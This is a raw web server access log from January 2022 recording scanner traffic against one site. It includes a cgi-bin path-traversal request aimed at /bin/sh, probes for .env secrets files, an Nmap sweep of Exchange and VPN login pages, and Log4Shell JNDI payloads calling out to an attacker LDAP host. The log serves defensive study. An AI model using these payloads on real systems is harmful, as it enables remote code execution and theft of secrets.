45.146.165.37 - - [22/Jan/2022:00:11:10 -0500] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 5633 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
167.71.1.54 - - [22/Jan/2022:00:37:42 -0500] "GET / HTTP/1.1" 200 642 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
45.146.165.37 - - [22/Jan/2022:00:40:33 -0500] "GET / HTTP/1.1" 200 5786 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
36.108.170.121 - - [22/Jan/2022:00:40:44 -0500] "GET / HTTP/1.1" 200 963 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
109.237.103.9 - - [22/Jan/2022:00:42:14 -0500] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [22/Jan/2022:00:42:14 -0500] "GET /.env HTTP/1.1" 404 5638 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
107.189.28.51 - - [22/Jan/2022:00:43:52 -0500] "GET / HTTP/1.1" 200 963 "-" "-"
167.248.133.59 - - [22/Jan/2022:00:46:58 -0500] "GET / HTTP/1.1" 200 963 "-" "-"
167.248.133.59 - - [22/Jan/2022:00:46:59 -0500] "GET / HTTP/1.1" 200 623 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
45.146.165.37 - - [22/Jan/2022:00:56:51 -0500] "GET / HTTP/1.1" 200 5786 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
216.93.144.47 - - [22/Jan/2022:01:16:09 -0500] "GET /owa/auth/logon.aspx HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:09 -0500] "GET /dana-na/auth/url_default/welcome.cgi HTTP/1.1" 404 5190 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:09 -0500] "GET /index.html HTTP/1.1" 200 5717 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:09 -0500] "GET / HTTP/1.1" 200 982 "${jndi:ldap://216.93.144.47:13456}" "${jndi:ldap://216.93.144.47:13456}"
216.93.144.47 - - [22/Jan/2022:01:16:09 -0500] "POST /wsman/ HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:09 -0500] "GET /exchange/logon.asp HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:09 -0500] "GET /dashboard.html HTTP/1.1" 404 5190 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:09 -0500] "GET /mics/login.jsp HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:09 -0500] "POST /wsman/ HTTP/1.1" 404 5190 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:10 -0500] "GET /index.html HTTP/1.1" 200 982 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:10 -0500] "GET /dashboard.html HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:10 -0500] "GET /dana-na/auth/url_default/welcome.cgi HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:12 -0500] "GET /mifs/user/login.jsp HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:12 -0500] "GET /mifs/user/login.jsp HTTP/1.1" 404 5190 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:12 -0500] "GET / HTTP/1.1" 200 5717 "${jndi:ldap://216.93.144.47:13456}" "${jndi:ldap://216.93.144.47:13456}"
216.93.144.47 - - [22/Jan/2022:01:16:12 -0500] "GET /mics/login.jsp HTTP/1.1" 404 5190 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:13 -0500] "GET /owa/auth/logon.aspx HTTP/1.1" 404 5190 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
216.93.144.47 - - [22/Jan/2022:01:16:14 -0500] "GET /exchange/logon.asp HTTP/1.1" 404 5190 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
